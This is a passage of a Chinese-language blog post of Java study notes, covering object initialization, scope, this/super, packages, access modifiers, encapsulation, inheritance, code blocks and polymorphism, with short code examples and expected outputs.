class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">31</span>);<br></code></pre></td></tr></table></figure><p>加载 Person 类信息，只会加载一次</p><p>在堆中分配空间（地址）</p><p>完成对象初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">默认初始化   age=<span class="hljs-number">0</span>   name=<span class="hljs-literal">null</span><br>显示初始化   age=<span class="hljs-number">90</span>   name=<span class="hljs-literal">null</span><br>构造器初始化   age=<span class="hljs-number">31</span>   name=abc<br></code></pre></td></tr></table></figure><p>在对象在堆中的地址，返回给 p (p是对象名，也可以理解成是对象的引用)</p><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>属性（成员变量），可以被本类或其他类使用</p><p>可以加访问修饰符</p><p>有默认值，可以不赋值直接使用</p><p>生命周期长，伴随着对象的创建而创建，销毁而销毁</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>不可加修饰符</p><p>没有默认值，需要赋值使用</p><p>生命周期短，伴随代码块执行而创建，结束而销毁</p><h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><p><strong>static静态代码块（最先执行）</strong>、构造代码块、方法代码块、局部代码块、语句代码块</p><p><strong>属性和局部变量可以重名</strong>，优先使用局部变量，在<strong>同一个作用域中两个局部变量不能重名</strong></p><h1 id="this"><a href="#this" class="headerlink" title="this"></a>this</h1><ul><li><p>代表当前对象，打印对象的 hashCode，哪个对象调用方法，this 就指哪个对象</p></li><li><p>this 用于区分当前对象的属性和局部变量</p></li><li><p>this 不能在类外部使用，<strong>只能在类内部实例方法中使用</strong>，静态方法不可使用</p></li><li><p>类内部赋值和获取实例属性</p></li></ul><h2 id="类内部调用方法"><a href="#类内部调用方法" class="headerlink" title="类内部调用方法"></a>类内部调用方法</h2><p>方法名（实参列表）</p><p>​this.方法名（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-built_in">this</span>.test();<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br> <br></code></pre></td></tr></table></figure><h2 id="this方法"><a href="#this方法" class="headerlink" title="this方法"></a>this方法</h2><p>this（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String name)</span>&#123;<br>       <span class="hljs-built_in">this</span>(name,<span class="hljs-number">30</span>);<span class="hljs-comment">//必须放在第一行才能使用</span><br>       <span class="hljs-built_in">this</span>.name=name;<br>       System.out.println(<span class="hljs-built_in">this</span>.name);<br>       System.out.println(<span class="hljs-string">&quot;this&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String dname,<span class="hljs-type">int</span> age)</span>&#123;<br>       <span class="hljs-built_in">this</span>.age=age;<br>       System.out.println(<span class="hljs-string">&quot;Cat(String dname,int agr)&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>区分相同名字类，方便管理，控制访问范围</p><h2 id="建包"><a href="#建包" class="headerlink" title="建包"></a>建包</h2><p>建立不同的文件夹&#x2F;目录来保存类文件</p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>基本语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butterfly.app<br><span class="hljs-keyword">package</span> <span class="hljs-comment">//关键字</span><br>com.butterfly.app <span class="hljs-comment">//包名</span><br></code></pre></td></tr></table></figure><p>package 的作用是声明当前类所在的包，<strong>一个类只能有一个 package</strong></p><h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>import 指令位置放在 package 下，在类定义前面，可以有多句且没有顺序要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br>java.lang.*  是基本包，默认引入，不需要再引入<br></code></pre></td></tr></table></figure><h1 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h1><p>控制属性和方法的访问权限</p><p>修饰类的属性，成员方法及类</p><p>只有默认的和 public 才能修饰类，并且遵循上述访问权限的特点</p><table><thead><tr><th></th><th>本类</th><th>同包</th><th>子类</th><th>不同包</th></tr></thead><tbody><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>没有修饰符</td><td>√</td><td>√</td><td>×</td><td>×</td></tr></tbody></table><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><p>把属性私有，定义公开的 get、set 方法来验证数据合理性</p><p>e.g</p><p>定义 Account 类，要求具有属性：姓名 name（长度为2-4，初始化后不可修改）、余额 balance（必须大于20）、密码 password（必须是六位）。如果不满足，则给出提示信息，并给默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">Account.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> String password=<span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">if</span>(name==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.name!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字只能修改一次&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (name.length() &lt; <span class="hljs-number">2</span> || name.length() &gt; <span class="hljs-number">4</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;名字长度需要2-4位&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>            &#125;<br>        &#125;<br>       <br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> &#123;<br>        <span class="hljs-keyword">if</span>(balance&lt;=<span class="hljs-number">20</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;余额必须大于20&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">this</span>.balance = balance;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">if</span>(password==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;password不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(password.length()==<span class="hljs-number">6</span>)&#123;<br>            <span class="hljs-built_in">this</span>.password = password;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;密码必须是六位&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>Hello.java<br>Account account=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Account</span>();<br>        account.setName(<span class="hljs-string">&quot;null&quot;</span>);<br>        System.out.println(account.getName());<br>        account.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br>        System.out.println(account.getPassword());<br><br></code></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">子类</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">父类</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>a.     父类&#x2F;超类&#x2F;基类</p><p>​子类&#x2F;派生类</p><p>b. 多个类存在相同的属性和方法时，从中抽象出父类，在父类中定义相同的属性和方法，所有子类不需要再重新定义，只需要通过 extends 声明继承父类就行</p><p>c. 子类自动拥有父类的所有属性和方法（受访问修饰符影响）</p><p>d. 子类不能访问父类的属性和方法，可以通过父类的公开方法去访问，类似封装</p><p>e. 单继承机制，子类最多只能继承一个父类（直接继承），但是可以实现多个接口</p><p>f. 所有类都是 Object 的子类</p><p>g. 多次继承 查看方法</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>        String name=<span class="hljs-string">&quot;AA&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;A test&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    String name=<span class="hljs-string">&quot;BB&quot;</span>;<br>    String java=<span class="hljs-string">&quot;java&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> nums=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super可以访问的成员（属性和方法）</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//AA</span><br>        <span class="hljs-built_in">super</span>.test();       <span class="hljs-comment">//A test</span><br>        <span class="hljs-comment">//this可以访问的成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.nums);  <span class="hljs-comment">//100</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//BB</span><br>        <span class="hljs-comment">//this.demo();    //递归</span><br>        <span class="hljs-built_in">this</span>.test();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    String name=<span class="hljs-string">&quot;CC&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;C test&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super访问成员</span><br>        System.out.println(<span class="hljs-built_in">super</span>.java); <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//BB</span><br>        <span class="hljs-built_in">super</span>.test();  <span class="hljs-comment">//C test</span><br>        <span class="hljs-built_in">super</span>.demo();<br>        <span class="hljs-comment">//this可以访问哪些成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//CC</span><br>        <span class="hljs-built_in">this</span>.test();    <span class="hljs-comment">//C test</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="父类构造器"><a href="#父类构造器" class="headerlink" title="父类构造器"></a>父类构造器</h2><p>创建子类对象时，默认会调用父类的无参构造器 super( );</p><p>如果父类没有提供无参构造器，须在子类构造器中用 super 去知道使用父类哪个构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>(参数列表);<br>e.g.<br><span class="hljs-built_in">super</span>(name,age,sex);<br></code></pre></td></tr></table></figure><p><strong>super() 和 this() 都只能放在构造器第一行，因此不能共存在同一个构造器；</strong></p><p>3.父类构造器的调用不限于直接父类，一直往上追溯到 Object 类（顶级父类）</p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>用处</p><p>a) 子类和父类具有同名属性和方法时，<strong>默认使用子类的同名属性和方法</strong>。访问父类的属性或方法必须通过 super 来调用</p><p>b) super 代表父类对象的引用，用于访问父类对象的属性、方法、构造器</p><p>访问父类的属性（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.属性名；<br></code></pre></td></tr></table></figure><p>访问父类的方法（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.方法名（参数列表）；<br></code></pre></td></tr></table></figure><p>访问父类的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>（参数列表）；<br></code></pre></td></tr></table></figure><h1 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h1><p>子类可以重写方法和属性</p><h2 id="方法重写特点"><a href="#方法重写特点" class="headerlink" title="方法重写特点"></a>方法重写特点</h2><ul><li><p>也称为方法覆盖</p></li><li><p>子类方法的名称、参数、与父类完全相同</p></li><li><p>返回类型和父类一样，或则是父类返回类型的子类，比如父类返回类型是 Object，子类返回方法类型是 String</p></li><li><p>子类方法不能缩小父类方法的访问权限</p></li></ul><h2 id="重载与重写的区别"><a href="#重载与重写的区别" class="headerlink" title="重载与重写的区别"></a>重载与重写的区别</h2><p><strong>重载</strong>：<strong>同一个类</strong>，方法名相同，参数类型、个数或顺序不同，与返回值和修饰符无关</p><p><strong>重写</strong>：<strong>父类和子类</strong>中，方法名、参数相同，子类返回类型与父类一样或者是其子类，子类不能缩小父类的缩小访问范围</p><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h2><p>可以定义多个，与静态属性初始化优先级一样，按照定义顺序执行，随着类的加载而执行，只执行一次，执行时机比普通代码块早</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcdef&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcc&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="普通代码块"><a href="#普通代码块" class="headerlink" title="普通代码块"></a>普通代码块</h2><p>可以定义多个，按照定义顺序执行，随着对象创建而执行，提高构造器代码复用性，每次创建对象都会执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//1)super()</span><br>        <span class="hljs-comment">//2)调用本类普通代码块</span><br>        System.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类什么时候被加载"><a href="#类什么时候被加载" class="headerlink" title="类什么时候被加载"></a>类什么时候被加载</h2><ul><li><p>创建对象实例</p></li><li><p>创建子对象实例，父类也会被加载</p></li><li><p>使用类的静态成员时</p></li><li><p>使用子类静态成员时，父类也会被加载</p></li></ul><h2 id="创建对象时的调用顺序"><a href="#创建对象时的调用顺序" class="headerlink" title="创建对象时的调用顺序"></a>创建对象时的调用顺序</h2><ol><li>父类的静态代码块和静态属性初始化</li><li>子类的静态代码块和静态属性初始化</li><li>父类的普通代码块和普通属性初始化</li><li>父类的构造方法</li><li>子类的普通代码块和普通属性初始化</li><li>子类的构造方法</li></ol><p><strong>静态代码块只能调用静态成员，普通代码块可以调用任意成员</strong></p><h2 id="执行-new-Test-会输出什么"><a href="#执行-new-Test-会输出什么" class="headerlink" title="执行 new Test();会输出什么"></a>执行 new Test();会输出什么</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>&#123;<br>    Demo(String s)&#123;<br>        System.out.println(s);<br>    &#125;<br>    Demo()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Demo无参&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>    Demo demo1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo1初始化&quot;</span>);    <span class="hljs-comment">//第三步</span><br>    <span class="hljs-keyword">static</span> Demo demo2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo2初始化&quot;</span>); <span class="hljs-comment">//第一步</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;static执行&quot;</span>); <span class="hljs-comment">//第二步</span><br>        <span class="hljs-keyword">if</span>(demo2==<span class="hljs-literal">null</span>)<br>            System.out.println(<span class="hljs-string">&quot;demo2 is null&quot;</span>);<br>    &#125;<br>    Test()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Test无参&quot;</span>);   <span class="hljs-comment">//最后一步</span><br>    &#125;<br>&#125;<br>输出：<br>Demo2初始化<br><span class="hljs-keyword">static</span>执行<br>Demo1初始化<br>Test无参<br></code></pre></td></tr></table></figure><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="多态参数"><a href="#多态参数" class="headerlink" title="多态参数"></a>多态参数</h2><p>参数定义成父类类型，就可以传任意子类类型进去</p><h2 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h2><p><strong>a）</strong> 语法：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">父类类型引用名<span class="hljs-operator">=</span>new子类类型（）；<br></code></pre></td></tr></table></figure><p><strong>b）</strong> 父类引用指向子类对象</p><p><strong>c）</strong> 编译类型看左边，运行类型看右边</p><p><strong>d）</strong> 可以调用父类中所有成员（受访问修饰符影响）</p><p><strong>e）</strong>调用的时候，<strong>子类有就用子类的成员，没有就找父类（就近原则）</strong></p><p><strong>f）</strong>不能调用子类中特有成员</p><h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong>a）</strong>多态的前提：<strong>连个对象（类）存在继承关系</strong></p><p><strong>b）</strong>属性的值看编译类型</p><p><strong>c）</strong>方法都看运行类型，属性看编译类型</p><p><strong>d）</strong> <strong>instanceof</strong> 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型</p><p><strong>e）</strong>要调用子类中的特有成员要向上转型</p><h2 id="多态数组"><a href="#多态数组" class="headerlink" title="多态数组"></a>多态数组</h2><p>数组类型为父类类型，保存实际元素为子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        System.out.println(b.count);<br>        b.display();<br>        A a=b;<br>        System.out.println(a==b);<br>        System.out.println(a.count);<br>        a.display();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">200</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br>输出：<br><span class="hljs-number">200</span><br><span class="hljs-number">200</span><br><span class="hljs-literal">true</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h1 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a>动态绑定机制</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>       System.out.println(a.sum());<br>       System.out.println(a.sum1());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span 